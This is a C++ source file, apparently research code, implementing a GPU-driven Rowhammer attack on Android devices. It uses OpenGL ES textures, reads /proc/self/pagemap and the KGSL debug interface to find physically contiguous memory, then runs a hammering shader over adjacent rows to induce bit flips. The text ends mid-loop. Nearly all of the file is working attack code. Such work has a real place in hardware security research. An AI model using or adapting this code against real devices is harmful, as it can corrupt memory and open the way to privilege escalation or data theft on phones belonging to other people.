#include <iostream>
#include <GLES3/gl3.h>
#include <EGL/egl.h>
#include <GLES2/gl2ext.h>
#include <EGL/eglext.h>
#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <math.h>

#define TXTRNUM (150000)
#define EVICTTEXT (149999)

EGLDisplay display;
EGLSurface pBuffer;
EGLContext ctx;

typedef void (*glGetPerfMonitorGroupsAMD_t)(int*, size_t , uint*);
typedef void (*glGetPerfMonitorCounterStringAMD_t)(uint, uint, size_t, size_t*, char*);
typedef void (*glGetPerfMonitorGroupStringAMD_t)(uint, size_t, size_t*, char*);
typedef void (*glGenPerfMonitorsAMD_t)(size_t, uint*);
typedef void (*glGetPerfMonitorCountersAMD_t)(uint, int*, int*,size_t,uint*);
typedef void (*glSelectPerfMonitorCountersAMD_t)(uint, bool, uint, int, uint*);
typedef void (*glBeginPerfMonitorAMD_t)(uint);
typedef void (*glEndPerfMonitorAMD_t)(uint monitor);
typedef void (*glGetPerfMonitorCounterDataAMD_t)(uint, size_t, size_t, GLuint*, int*);
typedef void (*glGetPerfMonitorCounterInfoAMD_t)(uint, uint, size_t, void*);

 glGetPerfMonitorCountersAMD_t glGetPerfMonitorCountersAMD = (glGetPerfMonitorCountersAMD_t)eglGetProcAddress("glGetPerfMonitorCountersAMD");
 glGetPerfMonitorGroupsAMD_t glGetPerfMonitorGroupsAMD = (glGetPerfMonitorGroupsAMD_t)eglGetProcAddress("glGetPerfMonitorGroupsAMD");
 glGetPerfMonitorCounterStringAMD_t glGetPerfMonitorCounterStringAMD = (glGetPerfMonitorCounterStringAMD_t)eglGetProcAddress("glGetPerfMonitorCounterStringAMD");
 glGetPerfMonitorGroupStringAMD_t glGetPerfMonitorGroupStringAMD = (glGetPerfMonitorGroupStringAMD_t)eglGetProcAddress("glGetPerfMonitorGroupStringAMD");
 glGenPerfMonitorsAMD_t glGenPerfMonitorsAMD = (glGenPerfMonitorsAMD_t)eglGetProcAddress("glGenPerfMonitorsAMD");
 glSelectPerfMonitorCountersAMD_t glSelectPerfMonitorCountersAMD = (glSelectPerfMonitorCountersAMD_t)eglGetProcAddress("glSelectPerfMonitorCountersAMD");
 glBeginPerfMonitorAMD_t glBeginPerfMonitorAMD = (glBeginPerfMonitorAMD_t)eglGetProcAddress("glBeginPerfMonitorAMD");
 glEndPerfMonitorAMD_t glEndPerfMonitorAMD = (glEndPerfMonitorAMD_t)eglGetProcAddress("glEndPerfMonitorAMD");
 glGetPerfMonitorCounterDataAMD_t glGetPerfMonitorCounterDataAMD = (glGetPerfMonitorCounterDataAMD_t)eglGetProcAddress("glGetPerfMonitorCounterDataAMD");
 glGetPerfMonitorCounterInfoAMD_t glGetPerfMonitorCounterInfoAMD = (glGetPerfMonitorCounterInfoAMD_t)eglGetProcAddress("glGetPerfMonitorCounterInfoAMD");



int threadID[] = {0,0,0, 1,1,1, 2,2,2, 3,3,3, 4,4,4, 5,5,5, 6,6,6, 7,7,7, 8,8,8, 9,9,9, 10,10,10};


typedef struct{
    GLuint       *counterList;
    int         numCounters;
    int         maxActiveCounters;
} CounterInfo;


struct pagemap_entry{
    uint64_t pfn : 54;
    unsigned int soft_dirty : 1;
    unsigned int file_page : 1;
    unsigned int swapped : 1;
    unsigned int present : 1;
};


struct kgsl_entry {
	struct kgsl_entry* kgsl_next;
	void* kgsl_gpu_va;	// the same as virtual address for embedded device
	void* kgsl_va;		// no comments...
	void* kgsl_pa;		// will be filled by us during one-way lookup
	size_t kgsl_size;	// no comments...
	int kgsl_id;	// id of GL object
	char kgsl_flags[50];	// permissions mode
	char kgsl_type[50];	// in our case everything is gpumem
	char kgsl_usage[50];	// no comments...
	size_t kgsl_sglen;	// number of pages taken by entry
};


uint64_t read_entry(int fd, void* va){
	uint64_t data;
	struct pagemap_entry res;
	uint64_t pfn;
	if(sizeof(data) > pread(fd, &data, sizeof(data), (uint64_t)va / sysconf(_SC_PAGESIZE) * sizeof(uint64_t))){
		printf("COULDN'T READ FROM PAGEMAP %p\n", va);
		exit(1);
	};
	pfn = data & (((uint64_t)1 << 54) - 1);
	
	// res.pfn = data & (((uint64_t)1 << 54) - 1);
    // res.soft_dirty = (data >> 54) & 1;
    // res.file_page = (data >> 61) & 1;
    // res.swapped = (data >> 62) & 1;
    // res.present = (data >> 63) & 1;
	return (uint64_t)( pfn * sysconf(_SC_PAGE_SIZE)) + ((uint64_t)va % sysconf(_SC_PAGE_SIZE));
}



    void getGroupAndCounterList(GLuint **groupsList, int *numGroups, CounterInfo **counterInfo){
        GLint          n;
        GLuint        *groups;
        CounterInfo   *counters;
        glGetPerfMonitorGroupsAMD(&n, 0, NULL);
        groups = (GLuint*) malloc(n * sizeof(GLuint));
        glGetPerfMonitorGroupsAMD(NULL, n, groups);
        *numGroups = n;
        *groupsList = groups;
        counters = (CounterInfo*) malloc(sizeof(CounterInfo) * n);
        for (int i = 0 ; i < n; i++ ){
            glGetPerfMonitorCountersAMD(groups[i], &counters[i].numCounters,&counters[i].maxActiveCounters, 0, NULL);
            counters[i].counterList = (GLuint*)malloc(counters[i].numCounters * sizeof(int));
            glGetPerfMonitorCountersAMD(groups[i], NULL, NULL, counters[i].numCounters, counters[i].counterList);
        }
		*counterInfo = counters;
    }
    
    static int  countersInitialized = 0;
        
    int getCounterByName(char *groupName, char *counterName, GLuint *groupID, GLuint *counterID){
        static int          numGroups;
        static GLuint       *groups;
        static CounterInfo  *counters;
        int          i = 0;
        if (!countersInitialized){
            getGroupAndCounterList(&groups, &numGroups, &counters);
            countersInitialized = 1;
        }
        for ( i = 0; i < numGroups; i++ ){
           char curGroupName[256];
           glGetPerfMonitorGroupStringAMD(groups[i], 256, NULL, curGroupName);
		//    printf("GROUP CMP %s\n", curGroupName);
           if (strcmp(groupName, curGroupName) == 0){
               *groupID = groups[i];
				// printf("SUCCESS GROUP\n");
               break;
           }
        }

        if ( i == numGroups )
            exit(-1);           // error - could not find the group name

        for ( int j = 0; j < counters[i].numCounters; j++ ){
            char curCounterName[256];
            glGetPerfMonitorCounterStringAMD(groups[i], counters[i].counterList[j], 256, NULL, curCounterName);
			// printf("COUNTER CMP %s\n", curCounterName);
            if (strcmp(counterName, curCounterName) == 0){
                *counterID = counters[i].counterList[j];
				// printf("SUCCESS COUNTER\n");
                return 0;
            }
        }
        exit(-1);           // error - could not find the counter name
    }

const char *vertexShaderSource = "#version 300 es\n"
    "layout (location = 0) in vec3 aPos;\n"
	"uniform vec2 a_rnd;\n"
    "void main()\n"
    "{\n"
    "   gl_Position = vec4(a_rnd.x, a_rnd.y, 0.f, 1.0);\n"
    "}\0";

const char *fragmentShaderSource = "#version 300 es\n"
    "out vec4 FragColor;\n"
	"uniform sampler2D u_texture;\n"
	"uniform vec2 a_rnd2;\n"
    "void main()\n"
    "{\n"
    "FragColor =  texelFetch(u_texture, ivec2(a_rnd2), 0);\n"
    "}\n\0";

const char *hammeringShaderSource = "#version 300 es\n"
	"uniform sampler2D row1;\n"
	"uniform sampler2D row2;\n"
	"uniform int border;\n"
	"layout (location = 0) in vec3 threadD;\n"
	"uniform sampler2D evict1;\n" //  has size of 64 regular pages, needed to evict caches
	"uniform sampler2D evict2;\n" //  has size of 64 regular pages, needed to evict caches
	"uniform sampler2D evict3;\n" //  has size of 64 regular pages, needed to evict caches
	"uniform sampler2D evict4;\n" //  has size of 64 regular pages, needed to evict caches
	"uniform sampler2D evict5;\n" //  has size of 64 regular pages, needed to evict caches
	"uniform sampler2D evict6;\n" //  has size of 64 regular pages, needed to evict caches
	"uniform sampler2D evict7;\n" //  has size of 64 regular pages, needed to evict caches
	"uniform sampler2D evict8;\n" //  has size of 64 regular pages, needed to evict caches
	"uniform sampler2D evict9;\n" //  has size of 64 regular pages, needed to evict caches
	"uniform sampler2D evict10;\n" //  has size of 64 regular pages, needed to evict caches
	"uniform sampler2D evict11;\n" //  has size of 64 regular pages, needed to evict caches
	"uniform sampler2D evict12;\n" //  has size of 64 regular pages, needed to evict caches
	"uniform sampler2D evict13;\n" //  has size of 64 regular pages, needed to evict caches
	"uniform sampler2D evict14;\n" //  has size of 64 regular pages, needed to evict caches
	"uniform sampler2D evict15;\n" //  has size of 64 regular pages, needed to evict caches
	"out vec4 val;\n"
	"void main(){\n"
	"	//int id = int(threadD.x) % 8;\n"
	"	for(int i = 0; i < border; i++){\n"
	"		\n"
	"		val += texelFetch(row1, ivec2( 0, 0), 0) + "
	"		 texelFetch(row2, ivec2(0,0), 0) + "
	"		 texelFetch(evict1, ivec2(0, 0), 0) + "
	"		 texelFetch(evict1, ivec2(0, 2), 0) + "
	"		 texelFetch(evict2, ivec2(0, 0), 0) + "
	"		 texelFetch(evict2, ivec2(0, 2), 0) + "

	"		 texelFetch(evict3, ivec2(0, 0), 0) + "
	"		 texelFetch(evict3, ivec2(0, 2), 0) + "

	"		 texelFetch(evict4, ivec2(0, 0), 0) + "
	"		 texelFetch(evict4, ivec2(0, 2), 0) + "

	"		 texelFetch(evict5, ivec2(0, 0), 0) + "
	"		 texelFetch(evict5, ivec2(0, 2), 0) + "
	
//	"                texelFetch(evict10, ivec2(0, 0), 0) + "
  //      "                texelFetch(evict10, ivec2(0, 2), 0) + "
	
//	"                texelFetch(evict11, ivec2(0, 0), 0) + "
  //      "                texelFetch(evict11, ivec2(0, 2), 0) + "

//	"                texelFetch(evict12, ivec2(0, 0), 0) + "
  //      "                texelFetch(evict12, ivec2(0, 2), 0) + "

//	"                texelFetch(evict13, ivec2(0, 0), 0) + "
  //      "                texelFetch(evict13, ivec2(0, 2), 0) + "

//	"                texelFetch(evict14, ivec2(0, 0), 0) + "
  //      "                texelFetch(evict14, ivec2(0, 2), 0) + "

//	"                texelFetch(evict15, ivec2(0, 0), 0) + "
  //      "                texelFetch(evict15, ivec2(0, 2), 0) + "

//	"                texelFetch(evict9, ivec2(0, 0), 0) + "
 //       "                texelFetch(evict9, ivec2(0, 2), 0) + "


	"		 texelFetch(evict6, ivec2(0, 0), 0) + "
	"		 texelFetch(evict6, ivec2(0, 2), 0) + "

	"		 texelFetch(evict7, ivec2(0, 0), 0) + "
	"		 texelFetch(evict7, ivec2(0, 2), 0) + "

	"		 texelFetch(evict8, ivec2(0, 0), 0) + "
	"		 texelFetch(evict8, ivec2(0, 2), 0); \n"
	"	}\n"
	"	gl_Position = vec4(0.0, 0.0, 1.0, 1.0);\n"
	"}\n\0";

const char *hammeringVertexShaderSource = "#version 300 es\n"
	"uniform vec2 a_rnd;\n"
	"void main()\n"
	"{\n"
	"   gl_Position = vec4(0., 0., 0.f, 1.0);\n"
	"}\0";


const char *hammeringFragmetShaderSource = "#version 300 es\n"
	"in vec4 val;\n"
	"out vec4 FragColor;\n"
	"void main(){\n"
	"	FragColor = val;\n"
	"}\n";

void egl_setup() {
    int maj, min;
    display = eglGetDisplay(EGL_DEFAULT_DISPLAY);

    if (display == EGL_NO_DISPLAY) {
        printf("EGL_NO_DISPLAY");
        exit(-1);
    }

    if (!eglInitialize(display, &maj, &min)) {
        printf("eglinfo: eglInitialize failed\n");
        exit(-1);
    }

    printf("EGL v%i.%i initialized\n", maj, min);

    EGLint attribs[] =
    {
        EGL_NONE, 
        EGL_RENDERABLE_TYPE, EGL_OPENGL_ES3_BIT_KHR,
        EGL_RED_SIZE, 8,
        EGL_GREEN_SIZE, 8,
        EGL_BLUE_SIZE, 8,
        EGL_ALPHA_SIZE, 8,
        
    };
    
    EGLint pBuffer_attribs[] =
    {
        EGL_WIDTH, 32,
        EGL_HEIGHT, 32,
        EGL_TEXTURE_TARGET, EGL_NO_TEXTURE,
        EGL_TEXTURE_FORMAT, EGL_NO_TEXTURE,
        EGL_NONE
    };

    EGLint ctx_attribs[] =
    {
        EGL_CONTEXT_CLIENT_VERSION, 3,
        EGL_NONE
    };

    EGLint num_configs;
    EGLConfig config;

    if (!eglChooseConfig(display, attribs, &config, 1, &num_configs) || (num_configs < 1))
    {
        printf("Could not find config for %s (perhaps this API is unsupported?)\n", "GLES3");
    }
    EGLint vid;
    if (!eglGetConfigAttrib(display, config, EGL_NATIVE_VISUAL_ID, &vid))
    {
        printf("Could not get native visual ID from chosen config\n");
    }
    eglBindAPI(EGL_OPENGL_ES_API);

    pBuffer = eglCreatePbufferSurface(display, config, pBuffer_attribs);
    ctx = eglCreateContext(display, config, EGL_NO_CONTEXT, ctx_attribs);
    if (ctx == EGL_NO_CONTEXT) {
        printf("Context not created!\n");
    }

    if(!eglMakeCurrent(display, pBuffer, pBuffer, ctx))
    { 
        printf("eglMakeCurrent() failed\n");

    }

}



int main(){
	// #stage 1 vars
	egl_setup();
	unsigned int* textures_data = (unsigned int*) malloc(4096);
	int vertexShader = glCreateShader(GL_VERTEX_SHADER);
	int fragmentShader = glCreateShader(GL_FRAGMENT_SHADER);
	GLuint shaderProgram = glCreateProgram();
	GLuint shaderProgram2 = glCreateProgram();
	GLuint VAO;
	GLuint FBF;
	GLint tex_uniform_location;
	unsigned int readval[32][32];
	int success;
    	char infoLog[512];
	uint32_t rndX = rand() & 0b11111, rndY = rand() & 0b11111;
	// #stage 2 vars
	/*   Example of output of KGSL file
	 *
	 *  gpuaddr useraddr     size    id  flags       type            usage sglen
 	 *  b2e56000 b2e56000    65536    62 -r--pY     gpumem          command    16
	 *  b440a000 b440a000     4096    55 ----pY     gpumem           any(0)     1
	 *  b440c000 b440c000     4096    54 ----pY     gpumem           any(0)     1
	 */

	char filebuffer[1024];
	int pagemap_f = open("/proc/self/pagemap", O_RDONLY);
	FILE* pagemap_f2 = fopen("/proc/self/pagemap", "r");
	FILE*  progout = fopen("/data/local/tmp/mike/prog.out", "w");
	char kgsl_path[100]; // no buffer overwlof here, please:)
	struct kgsl_entry* kgsl_result[1000];
	size_t cont_kgsls = 0;
	struct kgsl_entry *kgsl_arr = NULL;
	struct kgsl_entry kgsl_cur;
	pid_t self = getpid();
	sprintf(kgsl_path, "/d/kgsl/proc/%d/mem", self);
	FILE* kgsl_f = fopen(kgsl_path, "r");
	size_t cur_i = 0;
	FILE* pagemap_csv = fopen("/data/local/tmp/mike/pagemap.dump", "w");
	FILE* kgsl_csv = fopen("/data/local/tmp/mike/kgsl.csv", "w");
	printf("SELF ID : %d\n", self);
	// STAGE #1

	memset(textures_data, 0xff, 4096);
	memset(readval, 0xaa, 32 * 32 * sizeof(unsigned int));
	GLuint VBO, tex, tex2[TXTRNUM];
	// while(1){
	//textures_data[0] = textures_data[8] = 0xbada110c;
	
	std::cout<<"Generated value sum==" << rndX + rndY << " ; rndX==" << rndX << "; rndY==" << rndY << "\n";

	glShaderSource(vertexShader, 1, &vertexShaderSource, NULL);
	glCompileShader(vertexShader);
	glGetShaderiv(vertexShader, GL_COMPILE_STATUS, &success);

 	if (success != GL_TRUE)
    {
        glGetShaderInfoLog(vertexShader, 512, NULL, infoLog);
        std::cout << "ERROR::SHADER::VERTEX::COMPILATION_FAILED\n" << infoLog << std::endl;
    }

	glShaderSource(fragmentShader, 1, &fragmentShaderSource, NULL);
	glCompileShader(fragmentShader);   	
	glGetShaderiv(fragmentShader, GL_COMPILE_STATUS, &success);
    if (success != GL_TRUE)
    {
        glGetShaderInfoLog(fragmentShader, 512, NULL, infoLog);
        std::cout << "ERROR::SHADER::FRAGMENT::COMPILATION_FAILED\n" << infoLog << std::endl;
		exit(1);
    }

	glAttachShader(shaderProgram, vertexShader);
	glAttachShader(shaderProgram, fragmentShader);
	glLinkProgram(shaderProgram);

 	glGetProgramiv(shaderProgram, GL_LINK_STATUS, &success);
    if (!success) {
        glGetProgramInfoLog(shaderProgram, 512, NULL, infoLog);
        std::cout << "ERROR::SHADER::PROGRAM::LINKING_FAILED\n" << infoLog << std::endl;
		exit(1);
	}
	glDeleteShader(vertexShader);
	glDeleteShader(fragmentShader);

	
	// FRAMEBUFFER
	glGenFramebuffers(1, &FBF);
	glBindFramebuffer(GL_FRAMEBUFFER, FBF);
	glGenTextures(1, &tex);
	glBindTexture(GL_TEXTURE_2D, tex);
	glTexImage2D(GL_TEXTURE_2D, 0, GL_RGBA, 32, 32, 0, GL_RGBA, GL_UNSIGNED_BYTE, readval);
	glFramebufferTexture2D(GL_FRAMEBUFFER, GL_COLOR_ATTACHMENT0, GL_TEXTURE_2D, tex, 0); 
	glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_CLAMP_TO_EDGE);	
	glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_CLAMP_TO_EDGE);
	glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_NEAREST);
	glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_NEAREST);
	if (glCheckFramebufferStatus(GL_FRAMEBUFFER) != GL_FRAMEBUFFER_COMPLETE){
		std::cout << "ERROR::FRAMEBUFFER:: Framebuffer is not complete!\n";
	}
	uint32_t ttmp = 0;

	// We need this texture for eviction ...
	glGenTextures(1, &tex2[EVICTTEXT]);
	glBindTexture(GL_TEXTURE_2D, tex2[EVICTTEXT]);
	ttmp = ttmp + rndX + rndY;
	glTexImage2D(GL_TEXTURE_2D, 0, GL_RGBA, 256, 256, 0, GL_RGBA, GL_UNSIGNED_BYTE, NULL);
	//glTexSubImage2D(GL_TEXTURE_2D, 0, rndX, rndY, 1, 1, GL_RGBA, GL_UNSIGNED_BYTE, &ttmp);
	glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_CLAMP_TO_EDGE);	
	glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_CLAMP_TO_EDGE);
	glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_NEAREST);
	glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_NEAREST);

	// These are common textures ...
	for(int i = 0; i < 50000; ++i){
		glGenTextures(1, &tex2[i]);
		glBindTexture(GL_TEXTURE_2D, tex2[i]);
		ttmp = ttmp + rndX + rndY; // in case of deduplication (currently not implemented in Android) ...
		glTexImage2D(GL_TEXTURE_2D, 0, GL_RGBA, 32, 32, 0, GL_RGBA, GL_UNSIGNED_BYTE, textures_data);
		//glTexSubImage2D(GL_TEXTURE_2D, 0, rndX, rndY, 1, 1, GL_RGBA, GL_UNSIGNED_BYTE, &ttmp);
		glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_CLAMP_TO_EDGE);	
		glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_CLAMP_TO_EDGE);
		glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_NEAREST);
		glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_NEAREST);
	}
	// DRAWING
	glClearColor(0.0f, 0.0f, 0.0f, 0.0f);
    glClear(GL_COLOR_BUFFER_BIT);
	glUseProgram(shaderProgram);
	tex_uniform_location = glGetUniformLocation(shaderProgram, "a_rnd");
	glUniform2f(tex_uniform_location, rndX / 32.f,  rndY / 32.f);
	tex_uniform_location = glGetUniformLocation(shaderProgram, "a_rnd2");
	glUniform2f(tex_uniform_location, rndX,  rndY);
	glBindTexture(GL_TEXTURE_2D, tex2[0]);
	glDrawArrays(GL_POINTS, 0, 1);

	//unsigned int* frame  = (unsigned int*)malloc(sizeof(unsigned int) * 32 * 32);
	//memset(frame, 0x00, 32 * 32 * sizeof(unsigned int));
	//glReadPixels(0, 0, 32, 32, GL_RGBA,GL_UNSIGNED_BYTE, frame);
	//printf("READVALS: \n");
	//for(int  i = 0; i < 32; ++i){
	//	for( int j = 0; j < 32; ++j){
		//	printf("%2d ", frame[i * 32 + j]);
				
	//	}
	//	printf("\n");
	//}

	
	// STAGE #2

	if(!pagemap_f || !kgsl_f){
		printf("Pagemap or KGSL interface is disabled( may be they both), please isntall all kernel modules or reinstall the kernel. See you later...");
		exit(1);
	}
	fseek(kgsl_f, 73, SEEK_SET);
	fwrite("gpuaddr,useraddr,size,id,flags,type,usage,sglen\n", 1, 48, kgsl_csv);
	while(fscanf(kgsl_f, "%p %p     %lu    %lu  %s      %s            %s %lu\n", &kgsl_cur.kgsl_gpu_va,
									 	&kgsl_cur.kgsl_va, &kgsl_cur.kgsl_size, &kgsl_cur.kgsl_id, kgsl_cur.kgsl_flags,
										kgsl_cur.kgsl_type, kgsl_cur.kgsl_usage, &kgsl_cur.kgsl_sglen) != EOF){
		if(strcmp(kgsl_cur.kgsl_usage, "texture"))
			continue;
		// we have texture
		kgsl_cur.kgsl_pa = (void*)read_entry(pagemap_f, (void*)kgsl_cur.kgsl_va);
		
		//fprintf(kgsl_csv,"%p,%p,%lu,%u,", kgsl_cur.kgsl_gpu_va, kgsl_cur.kgsl_pa, kgsl_cur.kgsl_size, kgsl_cur.kgsl_id);
                //fprintf(kgsl_csv,"%s,", kgsl_cur.kgsl_flags);
                //fprintf(kgsl_csv,"%s,", kgsl_cur.kgsl_type);
                //fprintf(kgsl_csv,"%s,", kgsl_cur.kgsl_usage);
                //fprintf(kgsl_csv,"%lu\n", kgsl_cur.kgsl_sglen);
		
		struct kgsl_entry** kgsl_ptr = &kgsl_arr;		
		while(*kgsl_ptr){
			if((*kgsl_ptr) && (*kgsl_ptr)->kgsl_pa > kgsl_cur.kgsl_pa)
				break;
			kgsl_ptr = &(*kgsl_ptr)->kgsl_next;
		}
		kgsl_cur.kgsl_next = (*kgsl_ptr);
		*kgsl_ptr = (struct kgsl_entry*)malloc(sizeof(struct kgsl_entry));
		**kgsl_ptr = kgsl_cur;
	}

	printf("\n=================================================SORTED LIST OF ENTRIES========================================\n\n");
	unsigned int counter = 1;
	unsigned int result = 0;
	struct kgsl_entry* first = kgsl_arr;
	kgsl_arr = kgsl_arr->kgsl_next;	
	fprintf(progout, "group_id,id,useraddr,pfn,alloc_order\n");
	while(kgsl_arr){
		kgsl_cur = *kgsl_arr;
		if((uint64_t)kgsl_arr->kgsl_pa - (uint64_t)first->kgsl_pa == counter * 0x1000){
			++counter;
		} else {
			if( counter >= 64){
				int target_level = 0;
				unsigned int counter2 = counter;
				while (counter2 >>= 1) ++target_level;
				//fprintf(progout, "NEW GROUP OF TEXTURES: \n");
				kgsl_result[cont_kgsls++] = first;
				//for(int i = 0; i < counter; ++i){
				//	kgsl_cur = *first;
				//	fprintf(progout, "mike,%d,%p,%p,%d\n", kgsl_cur.kgsl_id, kgsl_cur.kgsl_va, kgsl_cur.kgsl_pa, target_level); // only looks for order == 6
				//	first = first->kgsl_next;
				//}
				++result;
			}
			counter = 1;
			first = kgsl_arr;
		}
	
		kgsl_arr = kgsl_arr->kgsl_next;
	}

	fseek(pagemap_f2, 0, SEEK_SET);	
	while(int readsize = fread(filebuffer, 1, 1024, pagemap_f2)){
		fwrite(filebuffer, 1 , 1024, pagemap_csv);
	};
	



	// Native bit flip ...

		
	glBindFramebuffer(GL_FRAMEBUFFER, 0);
	vertexShader = glCreateShader(GL_VERTEX_SHADER);
	glShaderSource(vertexShader, 1, &hammeringShaderSource, NULL);
	glCompileShader(vertexShader);
	glGetShaderiv(vertexShader, GL_COMPILE_STATUS, &success);

 	if (success != GL_TRUE){
        	glGetShaderInfoLog(vertexShader, 512, NULL, infoLog);
	        std::cout << "ERROR::SHADER::VERTEX::COMPILATION_FAILED\n" << infoLog << std::endl;
	}

	fragmentShader = glCreateShader(GL_FRAGMENT_SHADER);
	glShaderSource(fragmentShader, 1, &hammeringFragmetShaderSource, NULL);
	glCompileShader(fragmentShader);   	
	glGetShaderiv(fragmentShader, GL_COMPILE_STATUS, &success);
	if (success != GL_TRUE)
	{
		glGetShaderInfoLog(fragmentShader, 512, NULL, infoLog);
		std::cout << "ERROR::SHADER::FRAGMENT::COMPILATION_FAILED\n" << infoLog << std::endl;
		exit(1);
	}

	glAttachShader(shaderProgram2, vertexShader);
	glAttachShader(shaderProgram2, fragmentShader);
	glLinkProgram(shaderProgram2);

	glGetProgramiv(shaderProgram2, GL_LINK_STATUS, &success);
	if (!success) {
		glGetProgramInfoLog(shaderProgram2, 512, NULL, infoLog);
		std::cout << "ERROR::SHADER::PROGRAM::LINKING_FAILED\n" << infoLog << std::endl;
		exit(1);
	}
	glDeleteShader(fragmentShader);
	glDeleteShader(vertexShader);
	int bitflips = 0;
	for(size_t i = 0; i < cont_kgsls; ++i){
		// preparing program to run
		struct kgsl_entry* evictarr[15];
		struct kgsl_entry* row1 = kgsl_result[i];
		// for(int j = 0; j < 16; ++j){
		// 	row1 = row1->kgsl_next;
		// }

		struct kgsl_entry* victim = row1;
		for(int j = 0; j < 16; ++j){
			victim = victim->kgsl_next;
//			if( j < 8)
			evictarr[j] = victim;
		}

		struct kgsl_entry* row2 = victim;
		for(int j = 0; j < 16; ++j){
			row2 = row2->kgsl_next;
		}
		
		for( int k = 0; k < 32; ++k){
			// Hammering two rows...
			glClearColor(0.0f, 0.0f, 0.0f, 0.0f);
			glClear(GL_COLOR_BUFFER_BIT);
			glUseProgram(shaderProgram2);
			glVertexAttribPointer(0, 10, GL_INT, GL_FALSE, 3 * sizeof(int), (void*)0);
			glEnableVertexAttribArray(0);

			// Binding textures
			GLuint row1TexLocation = glGetUniformLocation(shaderProgram2, "row1");
			GLuint row2TexLocation  = glGetUniformLocation(shaderProgram2, "row2");


			glUniform1i(row1TexLocation, 0);
			glUniform1i(row2TexLocation,  1);

			glActiveTexture(GL_TEXTURE0 + 0); // Row1 Texture Unit
			glBindTexture(GL_TEXTURE_2D, row1->kgsl_id);
			

			glActiveTexture(GL_TEXTURE0 + 1); // Row2 Texture Unit
			glBindTexture(GL_TEXTURE_2D, row2->kgsl_id);



			GLuint evictionTexLocation  = glGetUniformLocation(shaderProgram2, "evict1");
			glUniform1i(evictionTexLocation,  2);
			glActiveTexture(GL_TEXTURE0 + 2); // eviction Texture Unit
			glBindTexture(GL_TEXTURE_2D, evictarr[0]->kgsl_id);
			

			evictionTexLocation  = glGetUniformLocation(shaderProgram2, "evict2");
			glUniform1i(evictionTexLocation,  3);
			glActiveTexture(GL_TEXTURE0 + 3); // eviction Texture Unit
			glBindTexture(GL_TEXTURE_2D, evictarr[1]->kgsl_id);
			

			evictionTexLocation  = glGetUniformLocation(shaderProgram2, "evict3");
			glUniform1i(evictionTexLocation,  4);
			glActiveTexture(GL_TEXTURE0 + 4); // eviction Texture Unit
			glBindTexture(GL_TEXTURE_2D, evictarr[2]->kgsl_id);
			

			evictionTexLocation  = glGetUniformLocation(shaderProgram2, "evict4");
			glUniform1i(evictionTexLocation,  5);
			glActiveTexture(GL_TEXTURE0 + 5); // eviction Texture Unit
			glBindTexture(GL_TEXTURE_2D, evictarr[3]->kgsl_id);
			

			evictionTexLocation  = glGetUniformLocation(shaderProgram2, "evict5");
			glUniform1i(evictionTexLocation,  6);
			glActiveTexture(GL_TEXTURE0 + 6); // eviction Texture Unit
			glBindTexture(GL_TEXTURE_2D, evictarr[4]->kgsl_id);
			

			evictionTexLocation  = glGetUniformLocation(shaderProgram2, "evict6");
			glUniform1i(evictionTexLocation,  7);
			glActiveTexture(GL_TEXTURE0 + 7); // eviction Texture Unit
			glBindTexture(GL_TEXTURE_2D, evictarr[5]->kgsl_id);
			

			evictionTexLocation  = glGetUniformLocation(shaderProgram2, "evict7");
			glUniform1i(evictionTexLocation,  8);
			glActiveTexture(GL_TEXTURE0 + 8); // eviction Texture Unit
			glBindTexture(GL_TEXTURE_2D, evictarr[6]->kgsl_id);
			

			evictionTexLocation  = glGetUniformLocation(shaderProgram2, "evict8");
			glUniform1i(evictionTexLocation,  9);
			glActiveTexture(GL_TEXTURE0 + 9); // eviction Texture Unit
			glBindTexture(GL_TEXTURE_2D, evictarr[7]->kgsl_id);
		
			evictionTexLocation  = glGetUniformLocation(shaderProgram2, "evict9");
			glUniform1i(evictionTexLocation,  10);
			glActiveTexture(GL_TEXTURE0 + 10); // eviction Texture Unit
			glBindTexture(GL_TEXTURE_2D, evictarr[8]->kgsl_id);
			
			evictionTexLocation  = glGetUniformLocation(shaderProgram2, "evict10");
			glUniform1i(evictionTexLocation,  11);
			glActiveTexture(GL_TEXTURE0 + 11); // eviction Texture Unit
			glBindTexture(GL_TEXTURE_2D, evictarr[9]->kgsl_id);
	
			evictionTexLocation  = glGetUniformLocation(shaderProgram2, "evict11");
			glUniform1i(evictionTexLocation,  12);
			glActiveTexture(GL_TEXTURE0 + 12); // eviction Texture Unit
			glBindTexture(GL_TEXTURE_2D, evictarr[10]->kgsl_id);
	
			evictionTexLocation  = glGetUniformLocation(shaderProgram2, "evict12");
			glUniform1i(evictionTexLocation,  13);
			glActiveTexture(GL_TEXTURE0 + 13); // eviction Texture Unit
			glBindTexture(GL_TEXTURE_2D, evictarr[11]->kgsl_id);
	
			evictionTexLocation  = glGetUniformLocation(shaderProgram2, "evict13");
                        glUniform1i(evictionTexLocation,  14);
                        glActiveTexture(GL_TEXTURE0 + 14); // eviction Texture Unit
                        glBindTexture(GL_TEXTURE_2D, evictarr[12]->kgsl_id);

			evictionTexLocation  = glGetUniformLocation(shaderProgram2, "evict14");
                        glUniform1i(evictionTexLocation,  15);
                        glActiveTexture(GL_TEXTURE0 + 15); // eviction Texture Unit
                        glBindTexture(GL_TEXTURE_2D, evictarr[13]->kgsl_id);

			evictionTexLocation  = glGetUniformLocation(shaderProgram2, "evict15");
                        glUniform1i(evictionTexLocation,  16);
                        glActiveTexture(GL_TEXTURE0 + 16); // eviction Texture Unit
                        glBindTexture(GL_TEXTURE_2D, evictarr[14]->kgsl_id);
					
			printf("Trying to hammer chunk %d : %d\n", i, k);
			
			row1TexLocation = glGetUniformLocation(shaderProgram2, "border");;
			glUniform1i(row1TexLocation, 1000000);			
